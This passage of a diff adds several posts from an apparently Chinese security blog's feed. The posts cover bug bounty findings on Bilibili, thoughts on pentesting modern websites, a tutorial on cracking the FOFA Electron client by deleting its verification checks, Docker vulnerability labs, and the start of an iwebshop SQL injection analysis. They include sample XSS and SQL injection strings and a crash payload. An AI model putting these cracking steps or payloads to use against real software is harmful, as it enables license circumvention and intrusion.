+                        <span class="nx">goToUrl</span><span class="p">(</span><span class="nx">getUrlParam</span><span class="p">(</span><span class="s2">&#34;f&#34;</span><span class="p">))</span>
+                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                        <span class="nx">showError</span><span class="p">(</span><span class="s2">&#34;验证码错误，请重新输入！&#34;</span><span class="p">)</span>
+                    <span class="p">}</span>
+                <span class="p">}</span>
+            <span class="p">})</span>
+        <span class="p">}</span>
+    <span class="p">});</span>
+</code></pre></td></tr></table>
+</div>
+</div>
+<p>双引号和单引号均被转义,有兴趣的读者可以作为对自己的挑战.还有过滤的waf</p>
+]]></content></item><item><title>挖掘src漏洞</title><link>https://blue-bird1.github.io/posts/srcbug/</link><pubDate>Sun, 14 Apr 2019 23:22:41 +0800</pubDate><guid>https://blue-bird1.github.io/posts/srcbug/</guid><description>前言 挖src也将近两个月了,写篇博客总结一下. 首先挖洞成果 3中危 2低危, 收入~2k. 真实菜到扣脚,收入连泡面都吃不起.只挖了bilibili</description><content type="html"><![CDATA[
+
+<h2 id="前言">前言</h2>
+
+<p>挖src也将近两个月了,写篇博客总结一下.</p>
+
+<p>首先挖洞成果 3中危 2低危, 收入~2k. 真实菜到扣脚,收入连泡面都吃不起.只挖了bilibili src.</p>
+
+<p>另外新业务挖洞难度确实比较低,我甚至挖到了一个毫无难度的越权删除投票. bilibili 开新功能很频繁,我才能挖到这么多.一年半之前挖了一次,啥都没找到.</p>
+
+<p>这次的漏洞挖掘主要是web方向,只用了浏览器,其他工具都没用.</p>
+
+<h2 id="成功挖掘到的漏洞分析">成功挖掘到的漏洞分析</h2>
+
+<p>分享审核通过并已修复或无危害的漏洞供参考(非细节)</p>
+
+<h3 id="客户端dos">客户端dos</h3>
+
+<p>b站客户端加入了聊天功能,而聊天信息格式比较复杂.凡是复杂的格式都容易出现问题, 通过简单测试,发现通过构造畸形的json分享信息可直接崩溃客户端. 例如</p>
+
+<p><code>msg[content]={&quot;content&quot;:&quot;test&quot;&quot;}</code></p>
+
+<p>奖金 30安全币   1安全币==10人民币</p>
+
+<p>由于复杂格式,这种类型的漏洞应该还存在.事实上我测试时确实用第二种信息打崩溃了,不过忘记当时写的什么了</p>
+
+<h3 id="客户端越权">客户端越权</h3>
+
+<p>也是聊天系统的bug,未验证撤回信息者是否是信息发出人,导致可直接撤回他人信息.这个没什么技术含量,只是没人测试过这个功能,让我捡漏了而已.</p>
+
+<p>奖金 20安全币</p>
+
+<h3 id="隐藏页面反射xss">隐藏页面反射xss</h3>
+
+<p>这个xss其实也没什么技术含量,直接arg=<code>payload</code> . 没有被人发现是因为这个页面存在于登陆记录页面,然后我是坚持阅读js源码的,然后发现在js代码中有一段if 记录状态异常,就有一个按钮打开反馈页面.然后这个反馈页面存在反射xss.</p>
+
+<p>重分说明阅读js源码重要性,没阅读或不碰巧账号异常是不会发现这个页面</p>
+
+<p>奖金 65安全币</p>
+
+<h3 id="越权删除投票">越权删除投票</h3>
+
+<p>没有任何技术含量,只是没人测试过</p>
+
+<p>奖金 100安全币</p>
+
+<h3 id="前端验证">前端验证</h3>
+
+<p>bilibili 专车号虽然打开要求账号认证,但是实际上是前端认证.通过打断点到验证处修改可直接通过,但是由于内部功能都需要审核被忽略了.</p>
+
+<p>想快速找到你想要的代码,就要熟练使用chrome开发工具了. 在开发功能网络块可发现请求用户信息,所以可以通过断点XHR来定位代码.</p>
+
+<p>方法如图</p>
+
+<p><img src="https://i.loli.net/2019/04/14/5cb230c130fa4.png" alt="Screenshot_12.png" /></p>
+
+<pre><code>或者在控制台勾选Log XMLHTTPRequests
+</code></pre>
+
+<p><img src="https://i.loli.net/2019/04/14/5cb2311674088.png" alt="Screenshot_13.png" /></p>
+
+<p>打出的日志中会包含js代码位置</p>
+
+<h2 id="未成功找到的思路">未成功找到的思路</h2>
+
+<h3 id="window-postmessage">window postmessage</h3>
+
+<p><code>window.postmessage</code> 允许跨域发送,是一种新的攻击向量,如果js代码中接受message并用来构建html,会导致xss .b站全站约有7-8处接受postmessage的代码,均未验证发送者. 但是很遗憾的是只有一处真正用传送的数据直接做为html,这处还要求传送的字符串 &gt;0.导致无法利用做为xss</p>
+
+<p>想知道当前页面有没有这个功能?很简单,打开开发工具 sources面板 global listeners</p>
+
+<p><img src="https://i.loli.net/2019/04/14/5cb2362203afc.png" alt="Screenshot_14.png" /></p>
+
+<h4 id="缓存攻击">缓存攻击</h4>
+
+<p>缓存攻击最典型的就是</p>
+
+<p>配置cdn会缓存.js/.css文件,然后404页面返回码也是200,并包含一些用户信息,攻击者可使受害者打开 /noexist.js的url,此时cdn会认为返回码200,后缀也是js.会将这个404页面缓存起来,然后攻击者可读取这个缓存来获取信息</p>
+
+<p>很遗憾的是b站未符合上述条件,404就是404.并且使用的是现代化前端技术,未返回任何信息在html页面中,难以通过缓存来攻击</p>
+
+<h4 id="切换http方法-csrf">切换http方法 CSRF</h4>
+
+<p>注意到csrf参数只在post方法生效,试图转换成get方法来绕过csrf限制, 不过还没有找到同时允许get和post方法的api.能直接找到get方法的已经是csrf了(找到了一个还未修复)</p>
+]]></content></item><item><title>现代化网站的渗透测试</title><link>https://blue-bird1.github.io/posts/newsitethink/</link><pubDate>Fri, 22 Feb 2019 21:07:40 +0800</pubDate><guid>https://blue-bird1.github.io/posts/newsitethink/</guid><description>对现代化网站的渗透测试的思考 前言 首先定义本文所说的现代化网站. 现代化网站是指符合以下多个特征的对外服务. 储存,数据库,网站程序等服务器高度分</description><content type="html"><![CDATA[
+
+<h2 id="对现代化网站的渗透测试的思考">对现代化网站的渗透测试的思考</h2>
+
+<h3 id="前言">前言</h3>
+
+<p>首先定义本文所说的现代化网站. 现代化网站是指符合以下多个特征的对外服务.</p>
+
+<ul>
+<li><p>储存,数据库,网站程序等服务器高度分离</p></li>
+
+<li><p>实现现代化前端技术, 如三大框架, html5新api, websocket</p></li>
+
+<li><p>基于虚拟化技术的服务部署</p></li>
+
+<li><p>使用现代后端框架,如ssm,think5,gin,django</p></li>
+
+<li><p>外部服务高度集成</p></li>
+
+<li><p>多种客户端,包括Android,Ios,windows</p></li>
+</ul>
+
+<p>篇幅有限, 不再列举,但相信读者应该能理解笔者的意思.</p>
+
+<p>不属于现代化网站最典型的例子就是 下载cms,安装lnmp,直接安装网站程序.
+现在渗透教程基本都是基于不属于现代化网站的假设(实际上我还没发现基于渗透现代化网站假设的教程)</p>
+
+<h3 id="现代化特征对渗透测试的影响">现代化特征对渗透测试的影响</h3>
+
+<p>笔者按自己的思路逐个列举有影响的特征</p>
+
+<h4 id="cdn-反向代理">CDN/反向代理</h4>
+
+<p>使用了CDN将会隐藏真实IP, 导致常规端口扫描,弱口令扫描全部失效.
+但可以通过寻找真实ip来解决.
+反向代理则无解, 甚至可能只把代理服务器暴露于公网.敏感服务全在内网</p>
+
+<p>对绕过CDN这个问题, 已经有了一定的研究.有了安全工具, 如<a href="https://github.com/Tai7sy/fuckcdn">fuckcdn</a></p>
+
+<h4 id="数据分离">数据分离</h4>
+
+<p>上传文件服务器分离,将导致上传webshell技术失效, 很显然文件服务器是不可能执行webshell的. 上传危害最多只能达到上传html</p>
+
+<h4 id="websocket">websocket</h4>
+
+<p>之所以专门把websocket作为一点, 是因为感觉websocket属于盲区, burp,浏览器均不支持websocket的渗透测试.</p>
+
+<h4 id="新的h5-api">新的h5 api</h4>
+
+<p>html5提供了新的api,但是这方面的安全问题还没有被开发人员重视.这个可以从hackone平台上的漏洞报告看出.例如<a href="https://hackerone.com/reports/398054">DOM Based XSS in www.hackerone.com via PostMessage</a> .</p>
+
+<p><code>postmessage</code>这类api的输入是不可控的,如果不进行控制, 就是安全问题.</p>
+
+<h4 id="前后端分离">前后端分离</h4>
+
+<p>使用三大框架(vue,react, angular)的前端, 对后端进行分离. 也就是不再将url参数直接渲染到html,而通过JavaScript操作.反射xss全部失效,常规储存xss在框架的安全性下也变得渺茫.
+JavaScript操作带来的xss反而变为主流.这也对渗透测试人员阅读JavaScript代码带来了挑战
+也带来了部分好处,由于在前端操作,后端暴露的接口将会更多.</p>
+
+<h4 id="后端框架">后端框架</h4>
+
+<p>应用了框架后,简单注入全部失效,csrf部分失效, <code>id=x</code>这种低级注入消失.出现注入的点趋向二次注入, 编码注入. sqlmap是不提供原生支持的.</p>
+
+<h4 id="外部服务接入">外部服务接入</h4>
+
+<p>对某些功能不自行进行开发,使用其他公司的服务.这部分功能的安全性取决与该公司的安全水平, 不过真挖出漏洞就属于通用0day了.</p>
+
+<p>由于对接入服务的理解,接入处反而容易出现问题, 比如未预料的异常.(接入开发: ???,这个问题你怎么不在服务上处理.服务开发: ???,这个你怎么不在接入处处理)</p>
+
+<h4 id="多服务端">多服务端</h4>
+
+<p>提供了多平台客户端, 这就对渗透测试多平台渗透能力发出了挑战.
+不但要会web,还要会安卓/ios渗透测试, 反编译(客户端总是会有一些未公开的api).甚至还有IOT</p>
+
+<h4 id="风控">风控</h4>
+
+<p>好的风控系统 基本阻止了邮箱/短信轰炸.对需要爆破的漏洞也降低了危害.</p>
+
+<h4 id="xass">Xass</h4>
+
+<p>Sass, Pass,Fass等各种服务公司不断涌现,  可能出现刚拿下shell,想内网渗透,发现实际上服务是在某Sass上.或者发现服务api是在Fass上的,根本没有服务器</p>
+
+<h4 id="虚拟化">虚拟化</h4>
+
+<p>docker提供了优秀的服务分离,就算拿到了shell,也只是拿到了容器的shell. 容器虚拟化不一定安全,但是现在对这方面的研究还不是很多, 完全没有对绕过UAC的研究多.</p>
+
+<h3 id="对安全教程的思考">对安全教程的思考</h3>
+
+<p>现在一些安全教程还是停留在旧时代, <code>' and 1=1</code>,
+ <code>&lt;/x&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>固然是基础,挖掘思路也很重要.
+但是随着技术的发展, 渗透和开发技术也会走的更近, 新开发技术的爆发式增长,不可能像列中间件漏洞一样全部写出它们的渗透技术.就算有人写出来,等写出来黄花菜都凉了.
+安全教程应该更强调编程, 而不是培养只会用扫描器的驻场工程师.令人欣慰的是现在年轻的渗透测试人员大部分都会编程,还不止一门(就笔者圈子来看).</p>
+
+<h3 id="对安全工具的思考">对安全工具的思考</h3>
+
+<h4 id="扫描器">扫描器</h4>
+
+<p>随着技术的扩散,老式扫描器未来会面临失效.不支持浏览器模拟,只会抓a标签的扫描器, 对前后端分离无能为力. 基于流量和基于爬虫的扫描器会合并, 走向模拟获取流量进行扫描的模式
+对app的扫描器目前不支持对web的渗透测试</p>
+
+<h4 id="人工智能">人工智能</h4>
+
+<p>人工智能火热,各路安全公司都号称使用了AI技术(实际上怎么样就不知道了). 除了使用AI技术对AI进行对抗, AI扫描器也在发展中.
+这部分知识,我推荐兜哥的AI安全三部曲.</p>
+
+<p>可以重复的渗透测试动作,AI都可以模拟.随着发展,只会重复的渗透人员会面临淘汰.也能让安全人员拿出精力进行安全研究,而不是重复性的测试.</p>
+
+<h3 id="尾言">尾言</h3>
+
+<p>现在正是承前启后的时代,旧的开发技术未被淘汰,新的开发技术正在发展, 谁会在这个时代引领潮流, 或是被淘汰.让我们拭目以待吧</p>
+]]></content></item><item><title>Electron软件简单破解</title><link>https://blue-bird1.github.io/posts/electroncrack/</link><pubDate>Thu, 24 Jan 2019 23:14:25 +0800</pubDate><guid>https://blue-bird1.github.io/posts/electroncrack/</guid><description>electron 软件破解与修改入门 electron是一款流行的桌面软件框架, 可以用js来写桌面软件, 快速开发.为了提高开发效率,不少公司比如白帽汇直接采用</description><content type="html"><![CDATA[
+
+<h3 id="electron-软件破解与修改入门">electron 软件破解与修改入门</h3>
+
+<p>electron是一款流行的桌面软件框架, 可以用js来写桌面软件, 快速开发.为了提高开发效率,不少公司比如白帽汇直接采用了这种技术编写客户端,而不是传统的c++,c#.. 以下均采用白帽汇的fofa客户端作为例子讲解,目的是让fofa客户端的扫描功能无需验证. 这个功能命令是直接调用cli的, 并不需要网络验证.</p>
+
+<h4 id="解包">解包</h4>
+
+<p>electron的代码在<code>resources</code>目录,根据打包方式的不同, 可能看到<code>app</code>目录或者<code>app.asar</code>. 目录就不需要解包了.</p>
+
+<p><code>asar</code>并不是加密格式, 只是压缩格式. 可以使用<code>asar</code>工具直接解包.</p>
+
+<p>下载方式</p>
+
+<p><code>npm install -g asar</code></p>
+
+<p>解包命令</p>
+
+<p><code>asar extract app.asar  &lt;目录名&gt;</code></p>
+
+<p>例如<code>asar extract app.asar  fofa</code></p>
+
+<h4 id="代码目录">代码目录</h4>
+
+<p>代码目录是什么样子全看开发者. 通常都会存在<code>main.js</code>和<code>node_modules</code>目录.<code>main.js</code>是启动文件</p>
+
+<pre><code>»»»» ls                                                                       
+com  css  data  fonts  images  js  main.js  myjs  node_modules  package.json  tpl
+</code></pre>
+
+<p>目录命名很清晰</p>
+
+<h4 id="调试功能">调试功能</h4>
+
+<p>electron自带调试. 而且fofa的开发非常友好, 所有代码只有<code>com</code>目录的代码混淆了, 而且用的还是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="cm">/*  This obfuscated code was created by Javascript Obfuscator Free Version.*/</span>
+<span class="cm">/*  Javascript Obfuscator Free Version can be downloaded here              */</span>
+<span class="cm">/*  http://javascriptobfuscator.com                                        */</span>
+</code></pre></td></tr></table>
+</div>
+</div>
+<p>注释也很友好,直接打开就看到</p>
+
+<pre><code>  // 指定一个入口的html文件
+  mainWindow.loadURL('file://' + __dirname + '/tpl/login.html');
+
+  // 打开调试工具，其实就是chrome的那套调试工具
+    //  mainWindow.webContents.openDevTools();
+</code></pre>
+
+<p>直接解开注释就行了.</p>
+
+<p><code>mainWindow.webContents.openDevTools();</code></p>
+
+<h4 id="重打包">重打包</h4>
+
+<p>重打包很简单</p>
+
+<p><code>asar pack fofa app.asar</code></p>
+
+<p>直接覆盖原<code>app.asar</code>就行了</p>
+
+<p>上面的修改效果如下</p>
+
+<p><img src="https://i.loli.net/2019/01/25/5c4b21a447162.png" alt="Screenshot_5.png" /></p>
+
+<p>很眼熟吧, 就是chrome的调试功能</p>
+
+<p>然后我们需要寻找功能点.其实很简单,fofa的网页都放在<code>tpl</code>目录了. 在页面查看元素对比一下就知道了.  我们找到<code>tpl\edit-poc.html</code></p>
+
+<p>网页没混淆&hellip; 功能点也没在混淆的js里,直接在<code>script</code>标签里了(我白解密了)..</p>
+
+<p>看扫描按钮的文字是<code>开始扫描</code>, 直接在网页搜索一下, 直接搜到功能代码了..开发有良好的注释习惯,让我们为fofa开发点赞</p>
+
+<pre><code>$(&quot;.start_scan&quot;).click(function() {//开始扫描
+		bugnum = 0;
+		$('#san_result').html('');//默认清空 ,显数据
+		$('#san_result1').html('');//默认清空 ,显提示
+		isvipaaaa();
+		$('#san_result1').html('');
+		$('#san_result_have').html('');
+		$('#san_result_no').html('');
+		cvs_content = [];
+	    Buglist = '';
+	});
+</code></pre>
+
+<p>查看<code>isvipaaa</code>函数</p>
+
+<p>主要代码</p>
+
+<pre><code>        if(data.fcoin == 0 &amp;&amp; $(&quot;#scan_free&quot;).val() != 100 &amp;&amp; UserInfo.vip_level != 2) {                                    $('#san_result1').append('&lt;tr&gt;&lt;td colspan=&quot;4&quot;rowspan=&quot;4&quot;&gt;你的账号fofa币不足不能进行扫描。&lt;/td&gt;&lt;/tr&gt;');                    return;                
+        }                
+        if(($(&quot;#scan_free&quot;).val() != 100 &amp;&amp; UserInfo.vip_level !=2)||($(&quot;#scan_free&quot;).val() =='' &amp;&amp; UserInfo.vip_level == 2) ) {                    var scanok = scan_sure();                   
+        if(scanok == false) {    
+        return         
+        }               
+        }
+        if(data.is_verified){
+            /*扫描代码*/
+        }else{
+              $('#contentarea').html(&quot;&quot;);
+                    wrongmas1(&quot;对不起你还没有通过审核,请联系管理员!!&quot;);
+        }
+</code></pre>
+
+<p>可以看到就是三个<code>if</code>, 直接删除验证代码就完了..</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript">	<span class="kd">function</span> <span class="nx">isvipaaaa</span><span class="p">()</span> <span class="p">{</span> <span class="c1">//扫描
+</span><span class="c1"></span>		<span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span>
+			<span class="nx">url</span><span class="o">:</span> <span class="nx">login_url</span> <span class="o">+</span> <span class="s1">&#39;?email=&#39;</span> <span class="o">+</span> <span class="nx">UserInfo</span><span class="p">.</span><span class="nx">email</span> <span class="o">+</span> <span class="s1">&#39;&amp;key=&#39;</span> <span class="o">+</span> <span class="nx">UserInfo</span><span class="p">.</span><span class="nx">key</span><span class="p">,</span>
+			<span class="nx">dataType</span><span class="o">:</span> <span class="s1">&#39;json&#39;</span><span class="p">,</span>
+			<span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;get&#39;</span><span class="p">,</span>
+			<span class="nx">success</span><span class="o">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+					<span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#query_loading_tr&#39;</span><span class="p">).</span><span class="nx">css</span><span class="p">(</span><span class="s1">&#39;display&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
+					<span class="nx">$</span><span class="p">(</span><span class="s2">&#34;.but_bc&#34;</span><span class="p">).</span><span class="nx">click</span><span class="p">();</span>
+					<span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#scan_rate&#39;</span><span class="p">).</span><span class="nx">css</span><span class="p">(</span><span class="s1">&#39;width&#39;</span><span class="p">,</span> <span class="s1">&#39;0%&#39;</span><span class="p">);</span>
+					<span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#scan_rate_value&#39;</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="s1">&#39;0%&#39;</span><span class="p">);</span>
+					<span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#san_result&#39;</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
+					<span class="nx">$</span><span class="p">(</span><span class="s1">&#39;.start_scan&#39;</span><span class="p">).</span><span class="nx">attr</span><span class="p">(</span><span class="s2">&#34;disabled&#34;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+					<span class="nx">$</span><span class="p">(</span><span class="s1">&#39;.stop_scan&#39;</span><span class="p">).</span><span class="nx">attr</span><span class="p">(</span><span class="s2">&#34;disabled&#34;</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+					<span class="nx">$</span><span class="p">(</span><span class="s1">&#39;.export_scan&#39;</span><span class="p">).</span><span class="nx">attr</span><span class="p">(</span><span class="s2">&#34;disabled&#34;</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+					<span class="nx">$</span><span class="p">(</span><span class="s1">&#39;.Report_scan&#39;</span><span class="p">).</span><span class="nx">attr</span><span class="p">(</span><span class="s2">&#34;disabled&#34;</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+					<span class="c1">// $(&#39;#graphbox&#39;).css(&#39;display&#39;,&#39;&#39;);
+</span><span class="c1"></span>					<span class="kd">var</span> <span class="nx">FileName</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#FileName&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
+					
+					<span class="k">if</span><span class="p">(</span><span class="nx">from</span> <span class="o">==</span> <span class="s1">&#39;store&#39;</span><span class="p">)</span> <span class="p">{</span>
+						<span class="nx">scanPoc</span><span class="p">(</span><span class="nx">temp_params2</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">$</span><span class="p">(</span><span class="s2">&#34;#scan_free&#34;</span><span class="p">).</span><span class="nx">val</span><span class="p">());</span>
+					<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+						<span class="nx">scanPoc</span><span class="p">(</span><span class="nx">temp_params2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">$</span><span class="p">(</span><span class="s2">&#34;#scan_free&#34;</span><span class="p">).</span><span class="nx">val</span><span class="p">());</span>
+					<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div>
+<p>让我们看看效果,重打包替换</p>
+
+<p><img src="https://i.loli.net/2019/01/25/5c4b2518939b5.png" alt="Screenshot_6.png" /></p>
+
+<h4 id="尾声">尾声</h4>
+
+<p>感觉这个功能限制并没有什么意义, 本质上是执行一条系统命令用fofascan扫描而已</p>
+]]></content></item><item><title>docker搭建复现环境</title><link>https://blue-bird1.github.io/posts/dockertopoc/</link><pubDate>Sat, 19 Jan 2019 22:52:13 +0800</pubDate><guid>https://blue-bird1.github.io/posts/dockertopoc/</guid><description>docker搭建复现环境 安全人员进行漏洞复现经常需要搭建漏洞环境, docker能够很方便搭建漏洞环境,同时提供相当好的性能,管理功能. doc</description><content type="html"><![CDATA[
+
+<h3 id="docker搭建复现环境">docker搭建复现环境</h3>
+
+<p>安全人员进行漏洞复现经常需要搭建漏洞环境, docker能够很方便搭建漏洞环境,同时提供相当好的性能,管理功能.</p>
+
+<p>docker安装请参照空格表哥的<a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=47689&amp;highlight=docker">这篇文章</a></p>
+
+<p>搭建漏洞环境也有几种情况</p>
+
+<ul>
+<li><p>已经有现成的docker镜像</p></li>
+
+<li><p>只有源代码压缩包</p></li>
+
+<li><p>漏洞软件开源</p></li>
+</ul>
+
+<h4 id="寻找已有docker镜像">寻找已有docker镜像</h4>
+
+<p>dockerhub是官方的镜像仓库, 提供免费的公开镜像储存,也支持搜索   <a href="https://hub.docker.com/">网站url</a></p>
+
+<p>可以直接搜索镜像 <code>https://hub.docker.com/search?q=&lt;keyword&gt;&amp;type=image</code></p>
+
+<p>docker命令行也支持搜索镜像 命令格式 <code>docker search &quot;keyword&quot;</code></p>
+
+<p>例如 <code>docker search &quot;think5&quot;</code></p>
+
+<h4 id="从源代码搭建镜像">从源代码搭建镜像</h4>
+
+<p>以zzzphp为例. <a href="https://github.com/Earth-Online/poc_test/tree/master/zzzphp">github地址</a></p>
+
+<h5 id="dockerfile知识快速普及">Dockerfile知识快速普及</h5>
+
+<p>dockerfile是一个描述建造镜像流程的文件 每一行格式</p>
+
+<p><code>&lt;关键字&gt; &lt;n个参数&gt;</code></p>
+
+<p>搭建漏洞环境常用的几个关键字</p>
+
+<p><code>FROM 镜像名</code>  说明是从哪个镜像开始建造</p>
+
+<p><code>COPY 本地路径 镜像路径</code>  拷贝文件到镜像里</p>
+
+<p><code>ENV 变量名 变量值</code> 定义镜像内的环境变量</p>
+
+<p><code>RUN 命令</code> 在镜像运行一条命令</p>
+
+<p><code>WORKDIR 路径</code>   更改之后像<code>RUN</code>这类执行命令的路径</p>
+
+<h5 id="构建镜像">构建镜像</h5>
+
+<p>我挑选<code>webdevops/php-apache-dev:ubuntu-15.10</code>作为基础镜像, 这个镜像提供了非常快捷的搭建方法.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="k">FROM</span><span class="s"> webdevops/php-apache-dev:ubuntu-15.10</span><span class="err">
+</span><span class="err"></span><span class="k">COPY</span> --chown<span class="o">=</span>application:application .  /var/www/html<span class="err">
+</span><span class="err"></span><span class="k">ENV</span> WEB_DOCUMENT_ROOT /var/www/html</code></pre></td></tr></table>
+</div>
+</div>
+<p>只需要三行就能搭建出一个php环境</p>
+
+<p>第二行 <code>COPY --chown=application:application .  /var/www/html</code> 拷贝当前目录到<code>/var/www/html</code> 并更改所有者成<code>application:application</code> .</p>
+
+<p><code>application:application</code> 是这个镜像的服务器用户, 更改文件权限否则服务器不能读写文件</p>
+
+<p><code>ENV WEB_DOCUMENT_ROOT /var/www/html</code></p>
+
+<p><code>WEB_DOCUMENT_ROOT</code>是这个镜像的一个特殊环境变量 指向web目录</p>
+
+<p>使用 <code>docker build -t site .</code> 建造镜像和命名为<code>site</code></p>
+
+<h4 id="从git构建镜像">从git构建镜像</h4>
+
+<p>和从源代码构建的区别只是在于一个用<code>COPY</code> 一个在容器直接用<code>RUN</code>执行命令.</p>
+
+<p>例子</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="k">FROM</span><span class="s"> webdevops/php-apache-dev:ubuntu-15.10</span><span class="err">
+</span><span class="err"></span><span class="k">RUN</span> git clone https://github.com/DaBoQuan/cmseasy_decode /var/www/cmseasy <span class="o">&amp;&amp;</span> chown -R application:application /var/www/cmseasy<span class="err">
+</span><span class="err"></span><span class="k">ENV</span> WEB_DOCUMENT_ROOT /var/www/cmseasy</code></pre></td></tr></table>
+</div>
+</div>
+<p>只是简单的<code>git clone</code>到web目录和 <code>chown -R</code>更改文件权限</p>
+
+<h4 id="运行和数据库">运行和数据库</h4>
+
+<p>用docker运行很简单<code>docker run -d  -p 外部端口:镜像端口 &lt;镜像名&gt;</code></p>
+
+<p>如果运行site镜像就是 <code>docker run -d  -p 80:80 site</code></p>
+
+<p>一个网站当然需要一个数据库  如果你的服务器有一个外部ip 那么很简单</p>
+
+<p><code>docker run --name mysql -e MYSQL_ROOT_PASSWORD=password -p 3306:3306  mysql:5.6</code></p>
+
+<p>填数据库地址的时候填外部ip即可</p>
+
+<p>如果没有 可以用<code>docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' mysql</code> 获取docker内部ip 填写内部ip即可</p>
+]]></content></item><item><title>Iwebshop sql注入</title><link>https://blue-bird1.github.io/posts/iwebshopsql/</link><pubDate>Sat, 19 Jan 2019 18:12:19 +0800</pubDate><guid>https://blue-bird1.github.io/posts/iwebshopsql/</guid><description>&lt;h3 id=&#34;iwebshop-最新版本5-3-1-前台注入&#34;&gt;iwebshop 最新版本5.3.1 前台注入&lt;/h3&gt;
+&lt;p&gt;iwebshop最新版存在一个非常弱智的注入漏洞&lt;/p&gt;</description><content type="html"><![CDATA[<h3 id="iwebshop-最新版本5-3-1-前台注入">iwebshop 最新版本5.3.1 前台注入</h3>
+
+<p>iwebshop最新版存在一个非常弱智的注入漏洞</p>
+
+<p>主要导致原因 <code>$id        = IFilter::act(IReq::get('id'));</code></p>
+
+<p>开发者忘记写成 <code>IFilter::act(IReq::get('id'), 'int')</code>了,导致直接注入. 在其他文件也存在这个问题.</p>
+
+<p>这个文件需要商家账号才可以访问,是可以注册的</p>
+
+<p>漏洞点 <code>controllers/seller.php</code> 函数<code>categoryAjax</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">    public function categoryAjax()
+    {
+        $id        = IFilter::act(IReq::get(&#39;id&#39;));
+        $parent_id = IFilter::act(IReq::get(&#39;parent_id&#39;));
+        if($id <span class="err">&amp;&amp;</span> is_array($id))
+        {
+            foreach($id as $category_id)
+            {
+                $childString = goods_class::catChild($category_id);//父类ID不能死循环设置成其子分类
+                if($parent_id &gt; 0 <span class="err">&amp;&amp;</span> stripos(&#34;,&#34;.$childString.&#34;,&#34;,&#34;,&#34;.$parent_id.&#34;,&#34;) !== false)
+                {                    die(JSON::encode(array(&#39;result&#39; =&gt; &#39;fail&#39;)));                }
+            }</code></pre></td></tr></table>
+</div>
+</div>
+<p>直接将id传入到<code>catChild</code></p>
+
+<pre><code> public static function catChild($catId,$level = 1)
+    {        if($level == 0)        {
+            return $catId;
+        }
+
+        $temp   = array();
+        $result = array($catId);        $catDB  = new IModel('category');
+        while(true)
+        {
+            $id = current($result);
+            if(!$id)
+            {
+                break;
+            }
+            $temp = $catDB-&gt;query('parent_id = '.$id);
+</code></pre>
+
+<p>直接将id拼接到sql查询中.. 这个cms有一点sql过滤,但是非常弱,也就ctf入门题的水平</p>
+
+<p><code>lib/core/util/filter_class.php</code></p>
+
+<pre><code>   public static function string($str,$limitLen = false)
+    {
